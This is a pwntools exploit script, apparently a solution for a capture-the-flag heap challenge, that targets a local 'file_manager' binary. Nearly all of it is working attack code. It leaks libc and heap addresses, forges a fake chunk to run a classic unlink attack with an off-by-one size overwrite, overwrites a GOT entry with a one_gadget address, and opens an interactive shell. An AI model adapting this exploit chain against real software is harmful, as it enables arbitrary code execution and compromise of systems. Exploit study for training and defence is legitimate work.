from pwn import *
import time
context.log_level = 'debug'
p = process("./file_manager")

print p.recv()

def create(filename, length, content):

    p.sendline("1") #menu
    print p.recv()    
    p.sendline(filename)
    print p.recv()
    p.sendline(str(length))
    print p.recv()
    p.sendline(content)
    print p.recv()

def edit(index, content,i=0, x = 0,d=0):

    p.sendline("2")
    if x == 1:
        p.interactive()
    print p.recv()
    p.sendline(index)
    print p.recv()
    if i == 1:
        p.send(content)
    else:
        p.sendline(content)
    if d == 1:
        p.interactive()
    print p.recv()

def viewfile(index):

    p.sendline("3")
    print p.recv()
    p.sendline(index)
    return p.recv()

def delete(index):
    
    p.sendline("4")
    print p.recv()
    p.sendline(index)
    print p.recv()

#leak libc&heap.
create("afang", 0x100, "test") #0
create("afang", 0x100, "test") #1
create("afang", 0x100, "test") #2
create("afang", 0x100,"a"*200)#3
create("afang", 0x100, "bbbb\x00") #4
delete("3")
create("afang", 0x100, "aaa") #3
edit("3", "a"*7)
data = viewfile("3")
libc = u64(data.split("\n")[2].ljust(8,"\x00")) - 0x3c4b78
chunk = 0x602628 #7 ptr.
delete("0")
delete("3")
create("afang", 0x100, "a"*7 + "\x00") #0
edit("0","a"*7)
data = viewfile("0")
heap = u64(data.split("\n")[2].ljust(8,"\x00")) - 0x3f0
create("afang", 0x100, "a"*40+"\x00") #3
create("afang", 0x100, "a"*40+"\x00") #5
create("afang", 0x100, "a"*40+"\x00") #6
create("afang", 0x100, "a"*40+"\x00") #7

#start the unlink exploit:
create("afang", 0x28, "a"*8+"\x00")  #8, malloc 0x28 and then free it will reside in fastbin. And the next two title will be saved inside here
#&& the next two contents will be adjacent. This is the classic unlink attack scene. 
delete("8")
create("afang", 0xf8, "a"*40+"\x00")  #8
create("afang", 0x100, "a"*40+"\x00")  #9
create("afang\x00", 0x100, "a"*0xf8+p64(0x110)[:2]+"\x00") #10
delete("8")
#raw_input("here.")
create("afang", 0xf8, "x"*8) #overflow to #9 title size bit, fake wrong title size.
#raw_input("here.")
edit("8", p64(0x0) + p64(0xf1) + p64(chunk-0x18) + p64(chunk-0x10) + "a"*0xd0 + p64(0xf0),i=1)
raw_input("2")
#unlink trigger!
delete("9")

one_gadget = libc + 0xf1147 
#and now index 7 is pointing to the bss.
edit("8", p64(0x1)+p64(0x602030))
edit("7", p64(one_gadget),i=1,d=1)
p.interactive()



